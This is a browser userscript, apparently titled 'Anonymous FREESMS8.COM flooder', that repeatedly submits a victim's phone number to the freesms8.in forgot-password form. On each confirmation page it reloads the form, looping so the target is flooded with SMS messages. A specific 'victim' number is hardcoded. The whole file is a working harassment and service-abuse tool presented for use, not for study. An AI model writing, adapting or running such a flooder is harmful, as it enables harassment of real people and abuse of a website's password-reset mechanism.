// ==UserScript==>
// @name          Anonymous FREESMS8.COM flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*freesms8.in/*
// @credits       One
// ==/UserScript==

var victim=8092262928 //
var delay=0; // Enter delay in milliseconds if required

if(document.location=="http://www.freesms8.in/forgotpassword.aspx"||document.location=="http://www.freesms8.in/forgotpassword.aspx")
{
document.getElementById('ctl00_BodyPlaceHolder_UserName').value=victim;
document.getElementById('ctl00_BodyPlaceHolder_SendMe').click();
}
if(document.location=="http://www.freesms8.in/Forgot-Password-Sent.aspx"||document.location=="http://www.freesms8.in/Forgot-Password-Sent.aspx")
setTimeout("document.location='http://www.freesms8.in/forgotpassword.aspx'",delay);
